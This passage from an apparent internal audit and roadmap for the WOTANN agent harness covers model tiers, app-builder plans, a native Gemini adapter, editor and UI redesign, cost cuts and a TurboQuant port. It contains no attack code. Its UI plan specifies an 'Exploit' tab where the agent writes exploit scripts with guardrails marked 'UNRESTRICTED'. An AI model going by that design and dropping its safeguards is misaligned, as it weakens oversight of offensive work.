- **Llama 3.2 3B** (BFCL-v2 67.0, IFEval 77.4 — IFEval leader at class)
- Optional **Qwen 3 4B Thinking-2507** (BFCL-v3 71.2%, 256K context, native thinking)
- **Apple Intelligence 3B** via native Swift FoundationModels (don't replicate in Ollama)
- Skip Gemma 2B, Phi-3 Mini, TinyLlama base (require fine-tuning)

### Capability-augmentation ladder per tier
| Capability | 1-3B tier | 4-7B tier | 13-32B tier | Frontier |
|---|---|---|---|---|
| Tool-call | Tool RAG (filter to 5 max) + XGrammar/llguidance + single-turn | Hermes XML via vLLM parser, multi-tool OK | Native JSON mode | Native parallel tools |
| Vision | Florence-2 OCR + a11y tree | Gemma 3 4B / Phi-4 Multimodal native | Qwen 2.5 VL 7B+ | GPT-5/Claude native |
| Thinking | CoT + best-of-3 | CoT + self-consistency N=5 | Extended thinking where supported | Native o-series/Qwen3 |
| Structured output | XGrammar FSM (zero retries) | JSON mode + Pydantic retry | Native structured | Native strict JSON |
| Multi-file coherence | Single-file + feedback loop | 2-3 file with RAG | 10-file works | Full-project |
| Self-correction | LLMLOOP mandatory (compile+test feedback) | Optional | Self-verify | One-shot |

### Can a 3B actually build a Next.js app end-to-end?
**No.** Honest assessment:
- ✅ Single-page/component generation with spec
- ✅ File-by-file edits with RAG context injection
- ✅ Test-loop repair (LLMLOOP-style reaches 80.85% pass@1)
- ✅ Boilerplate (configs, routes, stubs)
- ❌ Spanning 10+ files coherently (requires 7B+)
- ❌ Correctly using App Router / Server Components / Metadata API
- ❌ Writing tests that actually pass on complex business logic

### Capability-augmenter improvements
`src/providers/capability-augmenter.ts` (207 LOC) is clean but thin. Gaps:
1. No constrained-decoding integration (need XGrammar/llguidance for Ollama)
2. No Tool RAG layer (needs semantic filter to top-5 tools per turn for <4B)
3. No parallel-tool-call handling (regex only catches first block)
4. Vision fallback is a stub (needs Florence-2 call)
5. Thinking heuristic is length-based (arbitrary — should be keyword-based)
6. No streaming parser (upgrade regex to incremental state machine)

---

## 15. App Builder Strategy

User chose: web apps + static sites + native mobile + full-stack. Maximum ambition.

### Top 20 UX patterns to steal (ranked by ROI)
1. **Visual Edits / Design Mode** (Lovable, v0) — click element, tweak CSS, NO credit spent
2. **Checkpoints & Rollback by work unit** (Replit) — named snapshots, git-aware undo
3. **Chat Mode vs Agent Mode split** (Lovable 2.0) — plan without triggering code
4. **Self-healing browser test loop** (Replit Agent 3) — tests in real browser, auto-fixes
5. **Multi-model picker with tier clarity** (Bolt: Haiku/Sonnet/Opus)
6. **WebContainers preview** (Bolt) — run in browser, no cloud cost
7. **Diff view per turn** (Bolt, v0)
8. **Real-time multiplayer** (Magic Patterns, Lovable)
9. **Image/screenshot-to-UI** (Magic Patterns, v0)
10. **Figma bidirectional** (Bolt via Anima, Magic Patterns native)
11. **Bidirectional Git sync with protected main** (v0)
12. **Mobile preview via Expo QR** (Bolt, Replit)
13. **Responsive preview with device presets** (Bolt)
14. **Integration library as primitives** (Create.xyz — "use Stripe/ElevenLabs/Maps")
15. **Design-system import** (Magic Patterns, Lovable)
16. **Security Scan built-in** (Lovable 2.0)
17. **Stacks / agent-builds-agents** (Replit)
18. **Knowledge base per project** (Lovable)
19. **Dev Mode in-app Monaco** (Lovable 2.0)
20. **Turbo Mode toggle** (v0 Pro)

### Top 10 footguns to avoid
1. Credit-metered bug loops ($100+ burned in a night — cap loop retries at 3)
2. WebContainer 30s boot timeouts (native Tauri FS as primary, sandbox as opt-in)
3. Credit system shock changes (never overnight; 90-day deprecation)
4. Agent redesigns app unprompted (strict scope discipline in system prompt)
5. Free tier killed without warning (Replit lesson)
6. Browser-only reliability (Tauri WebView everywhere)
7. Token pricing opacity (Cost Preview before execution)
8. Iframe sandbox escape (CSP headers + sandbox attribute hard-set)
9. Figma roundtrip loses interactivity (one-way with clear messaging)
10. Lock-in despite code export (generate clean standard-stack code, zero WOTANN imports)

### Architecture: Hybrid with local-default
WOTANN has unique advantages:
- `MonacoEditor.tsx` production-ready Monaco with FIM + WOTANN theme
- `MultiFileComposer.tsx` Cursor-Composer-style plan/review/apply via Tauri `composer.plan`/`composer.apply` RPCs — **already wired to filesystem**
- `WorkshopView.tsx` has tabs Active/Workers/Inbox/Scheduled/Playground/Workflows/Config

**Recommendation**:
- **Default = local filesystem** (Lovable-style but better — zero sandbox cost, zero token metering on execution, Monaco already wired)
- **Opt-in sandbox** = WebContainer / Modal / E2B for scratch builds
- **Target selector** chips in right rail: static site / web app / native mobile / full-stack — changes build pipeline

### Positioning vs each competitor (one sentence each)
- **vs Lovable**: WOTANN with no credit meter — execution on your hardware, you own files
- **vs Bolt**: WebContainers plus real local filesystem — "30-second boot" failure becomes one-keystroke escape
- **vs v0**: Decouples generation from Vercel — same shadcn/Tailwind fidelity, ship anywhere
- **vs Replit**: Same autonomous loop on your own Claude/Gemini/local Gemma key — no $250/night surprise
- **vs Magic Patterns**: Same design fidelity + full backend, local multiplayer via WebRTC
- **vs Create.xyz**: Integration-as-primitive via Skills (86 already shipped), skills are local files

---

## 16. Google Stack — The Gemini Opportunity

### Critical finding: WOTANN's Gemini adapter is a trap

WOTANN routes Gemini through `createOpenAICompatAdapter` at `/v1beta/openai/chat/completions`. This **BLOCKS**:
- `google_search` grounding (5000 prompts/month FREE on Flash)
- `code_execution` sandboxed Python (FREE)
- `url_context` (up to 20 URLs, 34MB each)
- `file_search`, `computer_use`, Live API
- `thinking_level` parameter, thought signatures
- Combined tool calls (google_search + code_execution + custom functions)

Free-tier user with GEMINI_API_KEY gets charged Flash tokens without getting the free sandbox, free search, or free URL retrieval.

### Google's stack (April 2026)
- **Google AI Studio** (aistudio.google.com) — Build mode launched Mar 20 2026, full-stack vibe coding with Firestore/SQLite/auth/npm packages/Firebase App Hosting deploy
- **Antigravity** (Nov 2025) — Gemini 3 Pro + **Claude Sonnet 4.5 + GPT-OSS in same IDE**, Editor View + Manager Surface + Browser Sub-Agent + `.gemini/antigravity/brain/` persistent memory
- **Opal** (Breadboard framework) — no-code, free, Gemini 2.5 Flash
- **Jules** (async, Gemini 2.5 Pro free / 3 Pro on $19.99 tier) — Environment Snapshots, Audio changelogs
- **Firebase Studio** (sunset March 22 2027, replaced by AI Studio + Antigravity)
- **Gemini Code Assist** — March 25 2026 free tier Flash-only
- **Gemini 3.1 Pro** — default March 9 2026, 1M context, LMArena 1501 Elo, 37.5% HLE

### Pricing wedge opportunity
| Tier | Gemini 3 Flash | Baseline |
|---|---|---|
| Input | $0.50/M | $1.25 (Claude Sonnet) |
| Output | $3.00/M | $10.00 (Claude Sonnet) |
| Free tier | 250 RPD + 250k TPM + **free Google Search grounding** + **free code execution** + **free URL context** | None |

### Recommendation
1. Build **native Gemini adapter** (`src/providers/gemini-native-adapter.ts`) hitting `https://generativelanguage.googleapis.com/v1beta/models/{model}:streamGenerateContent`
2. Expose `google_search` / `code_execution` / `url_context` as **universal capabilities** through capability-equalizer — route to Gemini when available
3. Make **Gemini 3 Flash the DEFAULT** for free-tier users (before March 25 2026 free-tier shift to Flash-only)
4. Announce: **"WOTANN free tier: Gemini 3 Flash + free web search + sandboxed Python"** — no other harness has this

### Top 15 Google-stack patterns to adopt
1. Native Gemini adapter with tools
2. Universal `web_search` capability routed to Gemini grounding
3. Sandboxed Python code execution (proxy Gemini's)
4. URL context tool (auto-inject when messages contain URLs)
5. Thought signatures preservation across tool loops
6. `thinking_level` parameter mapping (minimal|low|medium|high)
7. Antigravity's `brain/` directory pattern (`.wotann/brain/`)
8. Artifacts over logs (task lists, screenshots, browser recordings)
9. Browser Sub-Agent (headless Chromium + vision verification)
10. Manager Surface (multi-agent orchestration UI)
11. Environment Snapshots per project
12. Audio changelogs via Voice module
13. Starter Apps gallery (wotann skills marketplace)
14. Batch API (50% discount)
15. Native video understanding (1M-token video context)

---

## 17. Editor Redesign

User wants to KEEP the Editor tab. It must be Cursor-quality.

### Current WOTANN state (strong foundation)
- `EditorPanel.tsx` (378 LOC) — 3-column layout: FileTree | Editor+Tabs+Terminal | SearchReplace/Outline
- `MonacoEditor.tsx` (296 LOC) — Monaco with WOTANN dark theme, FIM inline completions, debounced 300ms
- `DiffOverlay.tsx` (240) — Accept/Reject-all + per-hunk, applyDiffHunks bottom-up splice
- `InlineDiffPreview.tsx` (252) — Monaco decorations, Tab=accept, Esc=dismiss
- `MultiFileComposer.tsx` (383) — prompt → plan → reviewing → applying state machine via Tauri RPCs
- `FileDiffCard.tsx` + `HunkReview.tsx` — tri-state hunks (accepted/rejected/undecided)
- `hash-anchored-edit.ts` (175 LOC) — SHA-256 16-char prefix

### Gaps vs competitors
| Gap | Competitor |
|---|---|
| No Plan mode (architect vs editor model split) | Aider (85% SOTA) |
| No checkpoint/restore per agent turn | Zed, Cursor |
| No Flow Awareness (terminal+edits+nav tracking) | Windsurf |
| No multi-buffer review tab | Zed |
| No progressive streaming diff (hunks render as generated) | Cursor |
| No repomap PageRank context selection | Aider (130+ langs) |
| No Cmd+Y/Cmd+N per-hunk shortcuts | Cursor |
| No queue messages during generation | Zed |
| No permissions picker per session | VS Code |
| Hash-anchored-edit built but NOT wired into composer | — |

### Redesign

**Consolidate 4 parallel implementations into one `useComposerStore` Zustand slice**:
- `DiffOverlay.tsx` → delete, functionality in ComposerPanel
- `MultiFileComposer.tsx` → becomes `ComposerPanel.tsx` dockable right panel in Editor tab
- `InlineDiffPreview.tsx` → keep, state derived from ComposerPanel
- `InlineEdit.tsx` → new Cmd+K popup

**New layout** — 3-pane in Editor tab:
```
┌─ Files ─┬─ Monaco + tabs + terminal ─────────┬─ ComposerPanel ─┐
│ tree   │                                     │ Plan banner     │
│ planner │ [Plan banner sticky — if active]    │ FileDiffCards  │
│ open 3  │ Monaco editor with diff decorations │  hunk A/R       │
│         │ Planner panel (checklist)           │ Proof panel    │
│         │                                     │  tests/types/   │
│         │ Chat overlay bottom                  │  lint/build    │
└─────────┴─────────────────────────────────────┴─────────────────┘
```

### Keyboard spec
**Inline edit (Cmd+K popup)**:
- `Cmd+K` open inline edit
- `Cmd+Enter` submit
- `Tab` accept entire diff
- `Esc` dismiss
- `Cmd+Right` accept next word
- `Cmd+Shift+K` open Composer with selection

**Composer panel**:
- `Cmd+Shift+Enter` plan edits (architect pass)
- `Cmd+Enter` apply all accepted hunks
- `Cmd+Shift+A` accept all in all files
- `Cmd+Shift+R` reject all in all files
- `Cmd+Y` accept current hunk (focused)
- `Cmd+N` reject current hunk
- `J`/`K` next/previous hunk
- `Shift+J`/`Shift+K` next/previous file
- `Option+Enter` jump to file at hunk
- `Cmd+Z` undo accept/reject within composer

**Review / checkpoint**:
- `Cmd+Shift+Z` restore last checkpoint
- `Cmd+Alt+R` open multi-buffer review tab
- `Cmd+.` toggle Composer panel
- `Cmd+Shift+.` toggle Plan banner

**Mode switches**:
- `Cmd+1` Chat mode (read-only /ask)
- `Cmd+2` Plan mode (architect proposes)
- `Cmd+3` Write mode (direct edits)
- `Cmd+4` Autopilot (run until complete)

### Format matrix
| Model tier | Primary format | Fallback |
|---|---|---|
| Small/free (Gemma 4, Flash, Haiku) | Hash-anchored (oh-my-pi 2-char CID better than WOTANN's 16-char SHA) | SEARCH/REPLACE |
| Large (Sonnet, Opus, GPT-5) | SEARCH/REPLACE (Anthropic-trained) or V4A (OpenAI) | Hash-anchored |
| Reasoning (o1, DeepSeek-R1) | editor-whole (whole file rewrite) | — |

Gate via `format: "auto" | "hash" | "search-replace" | "v4a"` in wotann.yaml.

### Workshop ↔ Editor integration
- **Workshop = write-first** (auto-applies trivial edits: single file, single hunk, linting)
- **Editor = review-first** (gatekeeps anything larger)
- Shared `useComposerStore` Zustand slice visible from both tabs
- "Jump to Workshop" button in Composer header opens originating task
- "Open in Editor" button in Workshop task card swings to Editor tab with Composer populated
- Autopilot boundary: Editor shows read-only diff stream mid-flight; accept/reject enabled only after completion

---

## 18. UI/UX Synergy

### Final recommendation: 5 desktop tabs + 3 iOS tabs + palette-first

**Desktop**: Chat · Editor · Workshop · **Builder** · Exploit

- **Chat** stays (default, 80% of sessions)
- **Editor** stays (user's explicit ask; Cursor-equivalent for modifying existing files)
- **Workshop** tightens — becomes monitoring dashboard for autonomous work (missions, schedules, channels, proofs). NOT chat.
- **Builder (NEW)** is standalone (Lovable/Bolt/v0/Replit parity — generative, fundamentally different from Editor's modifying existing)
- **Exploit** stays (security-research mode with unrestricted guardrails)

**NOT tabs** — these live in command palette / right rail / overlays:
Memory, Settings, Voice, Channels, Proof Bundles, Computer Use, Active-memory blocker, Dreaming cron, Provider Router

**iOS** (can't carry 5 tabs without shrinking below 44pt hit target): **Chat · Work · You**

**TUI**: same 5-tab strip with number keys 1-5.

### Layout principles

**Desktop frame** — 3-panel Linear/Obsidian pattern:
- Left nav (collapsible to 56px icon-rail)
- Main canvas (flex, never <520px)
- Right inspector rail (collapsible, 340px default, context-aware)

**Command palette (⌘K) is THE primary entry point**:
- Every RPC method (153), every skill (86), every thread, every channel, every memory entry
- Raycast/Linear pattern — fuzzy-search across everything
- Tabs are for spatial orientation ("where am I"); palette is for action ("what do I want")

### Per-view specs

**Chat**: Warp-inspired per-turn blocks with colored gutter (user=neutral, assistant=accent, tool=muted, artifact=warm). Thinking collapses by default with count indicator `▼ thinking · 340 tokens`. Left rail = LobeChat topic tree. Right rail = Memory blocks (Letta-style) + Tool whitelist + Channel status.

**Editor**: see §17 above.

**Workshop** (dashboard, not chat): 3 horizontal bands — Running / Queued / Completed. Left rail accordion: Missions / Schedule / Channels. Right rail: Standing Orders + Channel status.

**Builder**: 4-pane — Projects/Versions/Assets (left) | Chat+file list (middle-left) | Preview w/ device toggle (middle-right) | Target selector+Inspector+Deploy (right). Target chips (static/web/mobile/full-stack) change the whole build pipeline.

**Exploit**: Findings stack severity-sorted. Each finding expands to exploit script + proof frames + replay. "UNRESTRICTED" guardrail panel always visible in right rail.

**Memory** (modal via ⌘M): Top half = active blocks (always in prompt, editable, token budget bar). Bottom half = searchable archive (FTS5). Active-memory blocking sub-agent visible as pulsing gear icon — users SEE memory being edited.

**Proof Bundles** (unified viewer from Workshop/Exploit/Editor/Builder): Time-scrubber across frames (screenshot/log/diff/test/video). Export + HMAC-sign.

### Graceful-degradation UX

**Capability chips** in input bar right edge:
```
type a message...
Gemma 4 (local) · native:[text] · emulated:[tools,json] · ⚠ no:[vision] · ⏎
```
3 states: native (blue), emulated (amber), unsupported (gray).

**Fallback hints** — inline, unobtrusive:
```
╭─ heads-up ──────────────────────────────────────────╮
│ Vision isn't supported on Gemma 4. Options:         │
│   [describe image in text]                          │
│   [switch to Opus for this turn]                    │
│   [stick with Gemma, skip image]                    │
╰─────────────────────────────────────────────────────╯
```

**Nudges** — after N emulations: *"This session has emulated tools 6 times. Opus 4.6 would run ~3x faster for this workflow. [switch] [dismiss for today]"* — rate-limited to once per session.

### Microinteractions
- Streaming text: 30ms per char fade-in, cursor `▍` blink
- Tool-call reveal: slide from left 180ms ease-out-quart
- Thinking pulse: thin accent underline breathing (1.2s period)
- Diff-apply: selected hunks fade green 400ms, then gutter snaps
- Memory write: clockwise accent trace around border (400ms) while sub-agent writes
- Tab switch: canvas cross-fade 120ms (no horizontal slide — too mobile-coded)
- Command palette: 60%→100% scale + blur-from-0.95 pop (180ms, spring)
- Focus mode: rails slide out 240ms, canvas gains 8px padding 320ms

### Progressive disclosure (how to avoid "too many features" feel)
1. **Hide by default, reveal on intent** — thinking/tool calls collapse after completion
2. **Command palette over navigation** — 153 RPCs and 86 skills are palette entries, not tabs
3. **One surface, one job** — no tab does two jobs
4. **Rails earn their width** — context-aware, never fixed menu
5. **Focus mode as escape hatch** — `⌘⇧F` strips to just canvas + input

### Cross-surface continuity
- **Desktop → iOS**: Banner "Continue fix-auth · Desktop was here 2m ago ▸" on iOS open
- **iOS → Watch/CarPlay**: voice-only subset; Watch shows active mission + dictation
- **iOS Share Extension** drops URLs/screenshots into new turn or chosen thread
- **Offline iOS**: queues turns locally with dotted outline; sync on reconnect
- **Supabase Realtime** is the transport

---

## 19. Cost Optimization

### Headline: $22.50 → $4.01 (82% savings) achievable

### Top 25 optimizations ranked by $/user-month

**Week 1 — $15-25/mo, ~150 LOC**:
1. **1-hour cache TTL on stable blocks** ($8-11/mo) — `anthropic-adapter.ts:48-64` currently 5-min ephemeral only. `"ttl":"1h"` branch for system/tools.
2. **Stable-to-volatile prompt ordering linter** ($3-5/mo) — `prompt/engine.ts:151-285` has timestamps sneaking into cached prefix. Add SESSION_BOUNDARY marker.
3. **Demote Opus — Sonnet as default** ($3-5/mo) — `task-semantic-router.ts:178` lists Opus first (wrong, Sonnet handles 95%).
4. **Haiku routing bug fix** ($1-3/mo) — `task-semantic-router.ts:191` uses `"haiku"` string that doesn't match any adapter name.
5. **Discount-aware PRICING_TABLE** ($1-3/mo) — `cost-oracle.ts:47-58` uses non-discounted rates.
6. **OpenAI prefix caching stability** ($2-3/mo) — auto-cache ≥1024 tokens at 90% off if byte-stable.

**Week 2 — $8-13/mo, ~300 LOC**:
7. **Structured Outputs strict JSON Schema** ($2-4/mo) — eliminates prose-parsing retry tax ~20%.
8. **Semantic embedding cache** ($4-6/mo) — 60-70% near-dupe queries. LiteLLM/Redis pattern, MiniLM + 0.95 cosine.
9. **Tool-call result dedup within session** ($2-3/mo) — Read/Grep/Glob dupe calls cached.

**Week 3 — $7-14/mo, ~400 LOC**:
10. **Batch API routing** ($3-6/mo) — 50% off, stacks with caching = up to 95% total.
11. **Server-side compaction beta** ($2-4/mo) — `compact-2026-01-12` header, compact at cache-read rate.
12. **OpenAI Responses API stateful threads** ($2-4/mo) — `store:true`, `previous_response_id`, 40-80% cache util improvement.

**Week 4 — $7-12/mo, ~600 LOC**:
13. **Gemini grounding + code-exec + URL-context as FREE tools** ($3-5/mo) — currently WOTANN EMULATES these via text mediation!
14. **Gemini explicit CachedContent** ($1-3/mo) — 90% read discount above 32K.
15. **OpenAI Predicted Outputs** ($1-2/mo) — pass original file as `prediction`, 3-5x faster edits.
16. **Files API upload-once** ($1-2/mo) — Anthropic files-api-2025-04-14 beta. PDFs re-sent base64 every turn currently!
17. **Parallel tool calling guarantee** ($1-2/mo) — `token-efficient-tools-2025-02-19` beta header.

**Additional wedges**:
18. xAI Grok 4.1 Fast ($0.05/M cached, cheaper than Haiku)
19. Groq/Cerebras cascade (Cerebras 2500 tok/s vs Anthropic 80 tok/s — wall-clock = user attention cost)
20. DeepSeek R1 cache-hit ($0.14/M input — planning becomes $0.05 vs $0.50 Opus)
21. Skill metadata-only injection (YAML frontmatter only, body on-demand)
22. Idempotency keys on write requests
23. WASM bypass expansion (count, pretty-print, diff, sha256, uuid, regex test)
24. Token-accurate pruning (from usage, not char/4 heuristic)
25. Streaming tool responses (~30% wall-clock reduction)

### 1-hour session cost comparison
| Configuration | Cost |
|---|---|
| Opus 4.6 naive | $22.50 |
| Opus 4.6 + all opts | $4.01 |
| Sonnet 4.6 + all opts | $2.41 |
| Haiku 4.5 + all opts | $0.80 |
| Gemini Flash paid + cache | $0.32 (70× cheaper than naive Opus) |
| Local Gemma 4 via Ollama | ~$0.05 (electricity only) |

### 10 novel tools WOTANN should ship (no competitor has)
1. **Cross-device handoff tool** — iOS→Mac mid-flight via companion-server
2. **Provenance trace tool** — `why_did_you_do_that(token_offset)`
3. **Proof bundle attestation** — cryptographic signing
4. **Agent replay tool** — ai-time-machine.ts rewind/branch
5. **Time-traveling stream rule (TTSR)** as tool
6. **Hash-anchored edit with 2-char CID** (oh-my-pi pattern)
7. **Cost preview tool** — agent decides when to downroute
8. **Computer Use pluggable tool** — Anthropic native when Claude, 4-layer emulation otherwise
9. **Skills-as-tools via MCP exposure**
10. **Graph-DSL-as-a-tool** (`orchestrate(dsl)`)

---

## 20. TurboQuant Feasibility

### Critical finding: WOTANN's existing turboquant.ts is a 381-line marketing lie

`src/context/turboquant.ts` does NOT implement TurboQuant. It maps 2/4/8-bit configs to Ollama's existing `q2_K`/`q4_0`/`q8_0` KV cache types and computes effective-context multipliers. This is Ollama's built-in quantization rebranded.

### What TurboQuant actually is

Google Research/DeepMind/NYU paper (Apr 2025 arXiv 2504.19874, ICLR 2026, CC BY-4.0, NOT patented):

**"TurboQuant: Online Vector Quantization with Near-optimal Distortion Rate"**

Algorithm:
1. **PolarQuant stage** — random rotation matrix Π (QR decomp of Gaussian) induces concentrated Beta distribution per coordinate with near-independence
2. **Per-coordinate scalar quantization** — optimal b-bit quantizer per known distribution
3. **QJL residual correction** — 1-bit Quantized Johnson-Lindenstrauss on residual removes inner-product bias
4. **Decoding** — centroid lookup + rotate back via Π^T

Distortion bounds (Theorems 1-3):
- MSE: `D_mse ≤ (√3π/2) · (1/4^b)` → at b=3, ≈0.03; at b=4, ≈0.009
- Inner product: unbiased
- Information-theoretic lower bound: `D_mse ≥ 1/4^b` — TurboQuant within ~2.7× of optimal

Experimental:
- **KV cache**: 3.5 bits/channel = absolute quality neutrality vs FP16 (LongBench, NeedleInHaystack, RULER, L-Eval, ZeroSCROLLS on Llama-3.1-8B and Ministral-7B). Up to 6× memory reduction. 4-bit = 8× speedup on H100.
- **ANN search**: Recall > Product Quantization > RaBitQ at same bit budget. Indexing 0.0007s vs 37-494s PQ vs 597-3957s RaBitQ.

**Data-oblivious** — no training, no codebook, no calibration dataset. Unique for streaming/online workloads.

### Open-source ecosystem available TODAY

| Project | Lang | License | Scope |
|---|---|---|---|
| `teamchong/turboquant-wasm` npm | Zig→WASM+TS | MIT | **v0.3.0 April 8 2026, ~12 KB gzip, relaxed SIMD** |
| `vivekvar-dl/turboquant` pypi `turbokv` | Python/PyTorch | MIT | KV cache, Qwen/Llama/Gemma/Phi drop-in |
| `zlaabsi/turboquant-wasm` | TS/WASM | MIT | Browser+edge |
| `RecursiveIntell/turbo-quant` | Rust | MIT | TurboQuant+PolarQuant+QJL (alpha) |
| `atomicmilkshake/llama-cpp-turboquant` | C/C++ CUDA | MIT | llama.cpp fork with turbo3/turbo4 KV types, **75 tok/s Qwen3-8B RTX 3080** |
| `TheTom/llama-cpp-turboquant` | Metal | MIT | Apple Silicon KV cache |

### WOTANN applications ranked by feasibility × impact

**S-Tier — SHIP**:
- **A. Real vector store** (Feas 4, Impact 5): Replace TF-IDF with `turboquant-wasm` + MiniLM ONNX (23MB). 86 skills × 196B = 16.9KB full index vs 100MB+ Qdrant. Nobody else has this footprint.
- **C′. Real KV cache compression via llama-cpp-turboquant fork** (Feas 4, Impact 5): Makes existing `turboquant.ts` honest. Ship fork as optional bundled binary alongside Gemma 4.

**A-Tier**:
- **G. Semantic response cache** (Feas 4, Impact 3): `response-cache.ts` is exact-SHA. Quantized embedding keys enable near-dupe hits. 4-bit cosine against 1000 cached queries = 196KB, sub-ms on WASM SIMD.
- **D. Skill embedding compression** (Feas 5, Impact 3): Pre-compute 86 skill embeddings offline, ship static Uint8Array. At 4-bit × 384d = 192B/skill, full index ~16KB. "Find best skill for this prompt" in <5ms.
- **H. iOS memory retrieval** (Feas 3, Impact 4): WKWebView supports WebAssembly + relaxed SIMD since Safari 18. 10,000-entry memory at 4-bit 384d = 1.9MB vs 15MB float32 — fits iPhone SE RAM.

**B-Tier**:
- **F. Supabase relay compression** — marginal
- **B. KV cache for Gemma 4 specifically** — subsumed by C′

**C-Tier — Skip**:
- **C. Model weight quantization** — TurboQuant designed for vectors/activations/KV, not weights. AWQ/GPTQ remain SOTA.
- **E. Memory replay/episodic** — premature

### Port plan (concrete)

**New files**:
1. `src/memory/embedding-encoder.ts` (~150 LOC) — loads ONNX MiniLM or BGE-small via `onnxruntime-web`, exposes `encode(text): Float32Array`
2. `src/memory/quantized-vector-store.ts` (~250 LOC) — wraps `turboquant-wasm`, stores Uint8Array per doc, `search(query, topK)` via `dotBatch`
3. **RENAME** current `src/context/turboquant.ts` → `src/context/ollama-kv-compression.ts` (10-minute fix, kills the lie)

**New deps**:
- `turboquant-wasm` (12 KB gzip)
- `onnxruntime-web` (~3 MB)
- MiniLM ONNX weights (~23 MB int8) OR bge-small (~33 MB)

**Total new surface**: ~26-40 MB, already within WOTANN's "bundle local models" thesis.

**Risks**:
- ONNX cold-start ~500ms — mitigate with lazy init + SHA256-verified caching
- WASM SIMD on very old iOS (<18) — ship scalar fallback
- Community debate on MSE-only vs QJL — start with whatever turboquant-wasm ships
- Current naming debt — must rename before real TurboQuant ships

### Strategic verdict: SHIP IT (this week)

1. **Rename** current `src/context/turboquant.ts` → `src/context/ollama-kv-compression.ts`. 10-minute change.
2. **npm install** `turboquant-wasm onnxruntime-web`. Prototype `QuantizedVectorStore`. One day.
3. **Benchmark**: store 86 skills + memory entries, compare recall vs TF-IDF, measure bundle impact. One day.
4. **Replace** `vector-store.ts` internals keeping public API. Ship.
5. **Evaluate** `atomicmilkshake/llama-cpp-turboquant` as Gemma 4 local runtime. Longer horizon.

The TurboQuant name is already in Google Research's marketing — free attention. First open agent harness to say "powered by TurboQuant" truthfully captures it.

---

## 21. Strategic Pivot

### The 3-release roadmap

**v0.2.0 "Reconcile + Unblock"** (60-80 focused hours):
1. Delete `CREDENTIALS_NEEDED.md`, rotate Supabase key (today)
2. Fix 19 ship-blockers (§4)
3. Rename `turboquant.ts` → `ollama-kv-compression.ts` (10 min, kills the lie)
4. Delete ~4,500 LOC of dead code (§5)
5. Reconcile README (26 middleware→16-18, 29 patterns→11, 20 themes→0, autopilot doesn't exist, TerminalBench unclaimed)
6. Wire the ~12 unreachable desktop views OR remove claims
7. Fix 10 fake hook guarantees
8. Add YAML frontmatter to 10 silently-dropped skills
9. Migrate ESLint 9 config
10. Add Rust test + Swift build + lint to CI
11. Add release workflow + Dependabot + CodeQL

**v0.3.0 "Unbreak the Moat"** (60-80 hours):
12. Port hermes tool-serialization fixes (4 adapters, ~400 LOC)
13. Port hermes's 11 open-model parsers (~900 LOC) — **unique moat, no JS competitor has**
14. Port hermes's Holographic VSA memory (~250 LOC)
15. Port hermes's FTS5+Jaccard+HRR hybrid retrieval (~400 LOC)
16. Port hermes's shadow-git auto-checkpointing (~500 LOC)
17. **Ship real TurboQuant vector store** via `turboquant-wasm` + MiniLM ONNX (~400 LOC)
18. Port oh-my-pi's 2-char CID nibble-alphabet hashline
19. Port OpenClaw's active-memory blocking sub-agent (~400 LOC)
20. Port OpenClaw's `/elevated` session directive (~200 LOC)

**v0.4.0 "Use What You Have"** (60-80 hours, timing race vs Anthropic):
21. OAuth flows for Claude Pro/ChatGPT Plus/Copilot/Qwen (use user's existing subscriptions)
22. Native Gemini adapter with google_search + code_execution + url_context
23. Default free-tier users to Gemini 3 Flash
24. Adopt OpenClaw's skill-composition Computer Use (peekaboo-style)
25. Claude-Code-compatible skill packaging (superpowers pattern — 4× distribution)
26. LM Studio Discover tab clone
27. **Builder MVP** (Lovable/Bolt/v0/Replit parity — web apps + static sites + native mobile + full-stack)
28. Editor redesign (see §17)
29. 5-tab navigation (Chat · Editor · Workshop · Builder · Exploit)
30. Capability chips + graceful-degradation UX

**Ship v0.4.0 before June 2026** to beat Claude Apps public beta.

### Positioning

**Kill**: "The All-Father" positioning. "IDE for everything" framing. "26 middleware layers" and other inflated counts.

**Adopt**: **"The multi-device, multi-model, multi-surface agent harness with real verification — and real free-tier."**

Where WOTANN structurally wins:
- **iOS + Watch + CarPlay + Widgets + Siri + Share Extension** (OpenClaw has platform apps but no bundled frontier model; Cursor/Windsurf/Claude Code have no iOS)
- **Bundled Gemma + free tier** (privacy niche Devin/Factory/Copilot Workspace cannot match)
- **Proof bundles** (no competitor attests completion)
- **Real TurboQuant semantic memory** in <50KB bundle (no competitor has this footprint)
- **11 open-model tool parsers** unlocking every Qwen/Mistral/DeepSeek/Kimi/GLM (once ported from hermes)

Don't fight: OpenClaw on 23 channels, Cursor on Monaco autocomplete, Windsurf on SWE-1.5 model quality, Claude Code on 9000+ plugin ecosystem scale, OpenCode on daily release velocity.

### Race signal

The `KAIROS_*` feature flag cluster in Claude Code source leak signals Anthropic is building lifestyle-agent + app-builder in-house. Claude Apps leaked April 12 shows full-stack builder with DB+auth+deploy. **Phase 5-7 of WOTANN must ship before Kairos GA (May-Aug 2026) to own mindshare first.**

---

## 22. Master Punch List

Consolidated across 4 audit rounds:

- **19 CRITICAL** ship-blockers (§4)
- **~35 HIGH** (dead-code deletions §5, wiring fixes, parallel implementation consolidation, 10 fake guarantees §6, 15+ unreachable RPC handlers §7, Hi-DPI broken, maxPayload missing, iOS TaskMonitor callback, conversation-manager lies)
- **~60+ MEDIUM** (README reconciliation, security hardening, CI gaps, 7 empty test dirs, iOS 4 stale xcodeproj, postcss duplicate, 6 .DS_Store, parallel middleware implementations, 18 files over 800-line cap, 10-12% runtime.ts memory dead-after-init)
- **~25+ LOW** (13 module-level mutable globals, closure leaks in App.tsx, 62 console calls in auth/login.ts, iOS @ObservableObject → @Observable migration, stale TODOs)
- **~40+ UPGRADE** opportunities ranked by ROI (§11-20 detailed)
- **~30+ competitor patterns** to port (§12-13 detailed)
- **25 cost optimizations** (§19)
- **8 TurboQuant applications** (§20)

**Grand total: ~240+ items** consolidating all audit rounds + all strategic upgrades.

### Top 10 commits by single-commit leverage
1. Fix tool serialization in `anthropic-adapter.ts:126-132` (~30 LOC, restores entire harness thesis)
2. Port hermes's 11 open-model tool parsers (~900 LOC, no competitor has this in TS)
3. Rename `turboquant.ts` → `ollama-kv-compression.ts` (10 minutes, kills marketing lie)
4. Replace `vector-store.ts` with `turboquant-wasm` + MiniLM (~400 LOC, real semantic memory)
5. Migrate ESLint 9 config (15 minutes, un-silences CI)
6. Delete `CREDENTIALS_NEEDED.md`, rotate Supabase key (today)
7. Fix ECDH curve + field mismatch (~2 hours, iOS finally secure)
8. Add YAML frontmatter to 10 silently-dropped skills (30 minutes, registry goes 76→86)
